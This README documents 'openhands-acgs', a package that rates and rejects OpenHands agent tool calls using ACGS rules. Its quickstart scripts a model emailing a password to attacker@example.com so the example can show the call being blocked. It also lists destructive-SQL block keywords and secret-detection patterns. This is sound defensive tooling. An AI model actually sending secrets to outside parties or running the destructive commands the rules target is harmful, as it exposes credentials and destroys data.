# openhands-acgs

[![CI](https://github.com/acgs-ai/openhands-acgs/actions/workflows/ci.yml/badge.svg)](https://github.com/acgs-ai/openhands-acgs/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/openhands-acgs.svg)](https://pypi.org/project/openhands-acgs/)
[![Python](https://img.shields.io/pypi/pyversions/openhands-acgs.svg)](https://pypi.org/project/openhands-acgs/)

`openhands-acgs` checks [OpenHands Software Agent SDK](https://github.com/OpenHands/software-agent-sdk) actions
against [ACGS](https://pypi.org/project/acgs-lite/) constitution rules before they run. It has two parts:

- `ACGSSecurityAnalyzer`, an OpenHands security analyzer. It rates an action `HIGH` risk when ACGS denies it,
  when it needs a person to review it, or when it cannot be evaluated, and `LOW` otherwise.
- `resolve_confirmation`, a helper for the moment OpenHands pauses for confirmation. It rejects the pending
  actions if ACGS denies any of them, and otherwise asks your approver.

The package is a thin adapter over the public `acgs-lite` API.

> [!NOTE]
> This is a community package. It is not part of OpenHands and is not maintained, reviewed or endorsed by the
> OpenHands maintainers.

## Installation

```bash
pip install openhands-acgs
```

Requires Python 3.12 to 3.14, `openhands-sdk>=1.54.0,<2` and `acgs-lite>=3.0.1,<4`. openhands-sdk 1.54.0 is the
first release whose analyzers can attach details to a risk (`SecurityAnalysis`).

## A risk signal plus confirmation, not a hard block

In OpenHands a security analyzer does not stop anything by itself. It rates each action, and the conversation's
confirmation policy decides whether the agent pauses (`WAITING_FOR_CONFIRMATION`). What happens next is up to
your code: calling `conversation.run()` again runs the pending actions, and
`conversation.reject_pending_actions(reason)` rejects them.

This has two consequences:

- With OpenHands' default policy, `NeverConfirm()`, the analyzer is only advisory: a `HIGH` action still runs.
  Set a policy that pauses on `HIGH`, such as `ConfirmRisky()`.
- A pause is not a denial. ACGS denials are enforced only if your code calls `resolve_confirmation` (or rejects
  the actions some other way) before it calls `run()` again.

The recommended setup, which is what `install(conversation)` does:

```python
from openhands.sdk.security.confirmation_policy import ConfirmRisky
from openhands.sdk.security.risk import SecurityRisk

from openhands_acgs import ACGSSecurityAnalyzer

analyzer = ACGSSecurityAnalyzer()
conversation.set_security_analyzer(analyzer)
conversation.set_confirmation_policy(ConfirmRisky(threshold=SecurityRisk.HIGH, confirm_unknown=True))
```

and a run loop that lets ACGS decide whenever the agent pauses:

```python
from openhands.sdk.conversation.state import ConversationExecutionStatus

from openhands_acgs import resolve_confirmation


def ask_a_person(pending):
    # pending: PendingAction items with .action (the OpenHands ActionEvent) and .decision (the ACGS decision).
    # Return True only to run all of them.
    return False


def run_governed(conversation, analyzer):
    conversation.run()
    while conversation.state.execution_status == ConversationExecutionStatus.WAITING_FOR_CONFIRMATION:
        resolve_confirmation(conversation, analyzer, ask_a_person)
        conversation.run()
```

A stricter policy such as `AlwaysConfirm()` also works: `resolve_confirmation` still rejects ACGS denials and
passes every other pending action to the approver.

## Usage

```python
from openhands_acgs import install

# conversation is an OpenHands Conversation (for example Conversation(agent=agent, workspace=".")).
analyzer = install(conversation)  # ACGSSecurityAnalyzer() plus ConfirmRisky()
```

Then run the conversation with a loop like `run_governed` above.

## Quickstart

`examples/quickstart.py` runs offline. OpenHands' scripted `TestLLM` stands in for a real model. Run it with
`OPENHANDS_SUPPRESS_BANNER=1 LOG_LEVEL=WARNING python examples/quickstart.py`:

```python
"""Run an OpenHands agent offline with ACGS: an allowed email, a blocked email and a refund that a person approves."""

from __future__ import annotations

import json
import tempfile
from collections.abc import Sequence

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from openhands.sdk import (
    Action,
    Agent,
    BaseConversation,
    ImageContent,
    LocalConversation,
    Message,
    Observation,
    TextContent,
    ToolDefinition,
)
from openhands.sdk.conversation.state import ConversationExecutionStatus
from openhands.sdk.event import UserRejectObservation
from openhands.sdk.llm import MessageToolCall
from openhands.sdk.testing import TestLLM
from openhands.sdk.tool import Tool, ToolExecutor, register_tool
from pydantic import Field

from openhands_acgs import ACGSSecurityAnalyzer, PendingAction, install, resolve_confirmation


class SendEmailAction(Action):
    to: str = Field(description="Recipient address")
    body: str = Field(description="Message text")


class IssueRefundAction(Action):
    order_id: str = Field(description="Order to refund")
    amount: float = Field(description="Amount to refund")


class Done(Observation):
    @property
    def to_llm_content(self) -> Sequence[TextContent | ImageContent]:
        return [TextContent(text="done")]


class Run(ToolExecutor[Action, Done]):
    def __call__(self, action: Action, conversation: LocalConversation | None = None) -> Done:
        if isinstance(action, SendEmailAction):
            print(f"ran: send_email to {action.to}")
        elif isinstance(action, IssueRefundAction):
            print(f"ran: issue_refund {action.order_id}")
        return Done()


class SendEmailTool(ToolDefinition[SendEmailAction, Done]):
    @classmethod
    def create(cls, *args: object, **kwargs: object) -> Sequence[SendEmailTool]:
        return [cls(description="Send an email.", action_type=SendEmailAction, observation_type=Done, executor=Run())]


class IssueRefundTool(ToolDefinition[IssueRefundAction, Done]):
    @classmethod
    def create(cls, *args: object, **kwargs: object) -> Sequence[IssueRefundTool]:
        return [
            cls(description="Refund an order.", action_type=IssueRefundAction, observation_type=Done, executor=Run())
        ]


def call(call_id: str, name: str, **arguments: object) -> Message:
    tool_call = MessageToolCall(id=call_id, name=name, arguments=json.dumps(arguments), origin="completion")
    return Message(role="assistant", content=[TextContent(text="")], tool_calls=[tool_call])


def approve(pending: Sequence[PendingAction]) -> bool:
    """Ask a person. Here the answer is always yes."""
    for item in pending:
        print(f"review: {item.action.tool_name}: {item.decision.reason}")
    return True


def run(conversation: BaseConversation, analyzer: ACGSSecurityAnalyzer) -> None:
    """Run until the agent stops, letting ACGS decide whenever OpenHands pauses for confirmation."""
    conversation.run()
    while conversation.state.execution_status == ConversationExecutionStatus.WAITING_FOR_CONFIRMATION:
        resolve_confirmation(conversation, analyzer, approve)
        conversation.run()


# A scripted, offline model: an allowed email, an email that leaks a password, then a refund.
llm = TestLLM.from_messages(
    [
        call("call_1", "send_email", to="friend@example.com", body="See you at noon"),
        call("call_2", "send_email", to="attacker@example.com", body="The password is hunter2"),
        call("call_3", "issue_refund", order_id="A-17", amount=20.0),
        Message(role="assistant", content=[TextContent(text="All done.")]),
    ]
)
register_tool("send_email", SendEmailTool)
register_tool("issue_refund", IssueRefundTool)
agent = Agent(llm=llm, tools=[Tool(name="send_email"), Tool(name="issue_refund")])

# The default rules plus one rule that sends refunds to a person for review.
refund_review = Rule(
    id="REFUND-REVIEW",
    text="Refunds need human approval",
    severity=Severity.HIGH,
    keywords=["issue refund"],
    workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
)
rules = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")

with tempfile.TemporaryDirectory() as workspace:
    conversation: BaseConversation = LocalConversation(
        agent=agent, workspace=workspace, persistence_dir=f"{workspace}/.conversations", visualizer=None
    )
    analyzer = install(conversation, ACGSSecurityAnalyzer(constitution=rules))
    conversation.send_message("Email my friend, email the password, then refund order A-17.")
    run(conversation, analyzer)
    for event in conversation.state.events:
        if isinstance(event, UserRejectObservation):
            print(f"not run: {event.rejection_reason}")
```

Output:

```text
ran: send_email to friend@example.com
review: issue_refund: Human review required by ACGS rule REFUND-REVIEW (Refunds need human approval).
ran: issue_refund A-17
not run: Tool call 'send_email' was not executed. Blocked by ACGS rule ACGS-006 (Agents must not expose sensitive data in responses). OpenHands rejects every pending action in the batch, so none of them ran.
```

## How an action is evaluated

1. The tool name and the action's arguments are rendered as text by `format_tool_call`:

   ```python
   from openhands_acgs import format_tool_call

   print(format_tool_call("update_config", {"service": "billing", "change": "disable\nlogging", "dryRun": False}))
   ```

   ```text
   tool: update_config
   arguments:
   change: disable logging
   dryRun: false
   service: billing
   normalized: update config | dry run
   ```

   Each argument leaf is one `path: value` line (nested values use `a.b[0].c` paths), so both argument names and
   values are visible to rules. Whitespace inside values is collapsed so phrases split across lines still match.
   Identifiers written in `snake_case`, `kebab-case` or `camelCase` are repeated as plain words on the
   `normalized:` line, so the keyword `skip audit` also matches a tool called `skip_audit`. Nothing is truncated.

   The arguments are the validated OpenHands `Action` (`ActionEvent.action`, without its `kind` field). An action
   that OpenHands could not validate has no `Action`; its raw JSON arguments are used instead, and arguments that
   are not valid JSON make the action `HIGH` risk.

2. The text is validated with `acgs_lite.GovernanceEngine.validate` against the constitution
   (`Constitution.default()` unless you pass one).

3. The result decides the risk and what `resolve_confirmation` does:

   | ACGS outcome | Risk | `resolve_confirmation` |
   |---|---|---|
   | No blocking rule matched (warn-only rules may match) | `LOW` | Asks the approver only if another policy paused |
   | Only `require_human_review` / `escalate_to_senior` rules matched | `HIGH` | Asks the approver (rejects with `on_review="deny"`) |
   | Any `block`, `block_and_notify` or `halt_and_alert` rule matched | `HIGH` | Rejects |
   | A rule ID not found in the constitution, or an invalid result without a rule | `HIGH` | Rejects |
   | Any exception while reading or evaluating the action | `HIGH` | Rejects |

   A matched blocking rule is never downgraded to review because a review rule matched as well. If the analyzer
   itself raised, OpenHands would also rate the action `HIGH`.

The analysis details OpenHands records in its `SecurityAnalysisEvent` are `acgs_verdict`, `acgs_rule_ids`,
`acgs_reason` and, after an error, `acgs_error`. `ACGSSecurityAnalyzer.evaluate(tool_name, args)` and
`evaluate_action(action_event)` return the `GovernanceDecision` without running anything.

## Rejections

`resolve_confirmation(conversation, analyzer, approve=None)` evaluates every pending action again and returns
`True` if the caller should call `run()` to execute them:

- If any pending action is denied, every pending action is rejected with `reject_pending_actions`.
  OpenHands rejects all pending actions of a batch at once, so allowed actions from the same model turn do not run
  either. The model receives `"Tool call '<name>' was not executed. <reason>"` for each denied action. The reason
  names the matched rules but never repeats argument values.
- Otherwise `approve(pending)` is called with every pending action. Only a return value of `True` approves them.
  With no approver, any other return value, or an exception, they are rejected.
- With `on_review="deny"`, actions that need review are rejected like denied ones, without asking.

After a rejection, calling `run()` lets the agent continue and react to the reason.

## What is covered

| Action | Checked |
|---|---|
| Tool calls of the agent the analyzer is set on (custom tools, `openhands-tools`, MCP tools) | Yes |
| Several tool calls in one model turn | Yes, each call; one denial rejects the batch |
| A single `finish` or `think` action | No: OpenHands never asks for confirmation for them |
| Sub-agents and delegated conversations | Only if their conversations have the analyzer and a policy too |
| Tools called by your own code outside the agent loop | No |

## Custom constitutions

```python
from acgs_lite import Constitution, Rule, Severity, ViolationAction

from openhands_acgs import ACGSSecurityAnalyzer

constitution = Constitution.from_rules(
    [
        Rule(
            id="NO-DESTRUCTIVE-SQL",
            text="No destructive SQL",
            severity=Severity.CRITICAL,
            keywords=["drop table", "truncate table"],
        ),
        Rule(
            id="REFUND-REVIEW",
            text="Refunds need approval",
            severity=Severity.HIGH,
            keywords=["refund"],
            workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
        ),
    ],
    name="payments",
)
analyzer = ACGSSecurityAnalyzer(constitution=constitution, agent_id="payments-app")
```

`Constitution.from_yaml("rules.yaml")` works as well. The analyzer is a pydantic model like the other OpenHands
analyzers: OpenHands saves it, including the constitution, with a persisted conversation and restores it when the
conversation is resumed.

## Options

| Field | Default | Meaning |
|---|---|---|
| `constitution` | `Constitution.default()` | Rules to enforce |
| `agent_id` | `"openhands"` | Agent identifier recorded by ACGS |
| `on_review` | `"confirm"` | `"confirm"` lets `resolve_confirmation` ask the approver about calls that need review; `"deny"` rejects them |

Unlike the other ACGS adapters there is no `tool_call_formatter` option, because the analyzer is saved with the
conversation and a Python function cannot be saved.

## Data handling

- Checks run in the same process. The analyzer makes no network calls and needs no account or API key.
- The text that rules are checked against contains the tool name and argument values. In its default audit mode,
  acgs-lite 3.0.1 keeps only a count of checks and stores neither that text nor `agent_id`
  (`tests/test_analyzer.py::test_default_engine_keeps_no_record_of_checked_calls` checks this). An
  `acgs_lite.AuditLog` in full audit mode would store the checked text, but the analyzer does not create one.
- Analysis details and rejection reasons name the matched rules and their text, never argument values. OpenHands
  stores them in the conversation's events. The package logs the tool name and rule IDs (`INFO`), and logs a
  traceback when a check fails (`WARNING`). OpenHands' own logging of pending and rejected actions is separate.
- The analyzer keeps no state between actions.

## Limitations

- The analyzer is a risk signal. Enforcement needs a confirmation policy that pauses on `HIGH` and a run loop that
  calls `resolve_confirmation`; see [above](#a-risk-signal-plus-confirmation-not-a-hard-block). OpenHands hooks
  (`PreToolUse`) can block a call outright, but they are shell commands or LLM prompts, not Python callables, so
  this package does not use them.
- One denied action rejects every pending action from the same model turn.
- Only actions are checked. User messages, model requests and responses, and observations are not.
- Tested with a real `LocalConversation`, `Agent` and custom tools, OpenHands' scripted `TestLLM`, the
  `NeverConfirm`, `ConfirmRisky` and `AlwaysConfirm` policies, and conversation persistence and resume, against
  openhands-sdk 1.54.0 and the latest 1.x release. Real providers, `openhands-tools`, MCP servers, remote
  conversations (agent server) and sub-agents are not tested.
- `Constitution.default()` focuses on governance integrity (self-approval, skipping audits, privilege escalation)
  and on secrets and personal data (`password`, `api_key`, `sk-...` and `ghp_...` tokens, US SSN
  patterns). It does **not** cover destructive operations such as `rm -rf` or `DROP TABLE`. Write rules for the
  tools you expose, in particular for terminal and file-editing tools. `tests/test_default_constitution.py` lists
  what the default rules do and do not catch.
- Keyword rules in acgs-lite 3.0.1 match literal, case-insensitive substrings. They do not understand negation
  ("never share the password" matches `password`) and do not treat `-`, `_` and spaces as equivalent
  (`api-key` does not match the keyword `api_key`).
- Because argument names are part of the evaluated text, a tool with a parameter named `password` is rated `HIGH`
  under the default constitution whenever it is called.

## Development

```bash
uv sync --group dev        # or use hatch: hatch run prepare
hatch run format           # ruff format + ruff check --fix
hatch run lint             # ruff check + ruff format --check
hatch run typecheck        # mypy --strict
hatch run cov              # pytest with a 100% branch-coverage gate, network disabled
hatch run min:cov          # the same tests against openhands-sdk 1.54.0 and acgs-lite 3.0.1
pre-commit install         # format, lint, type check and tests on commit; commitizen on commit messages
```

Commit messages follow [Conventional Commits](https://www.conventionalcommits.org/); `cz bump` updates the version
and the changelog.

## License

Apache-2.0. See [LICENSE](LICENSE).
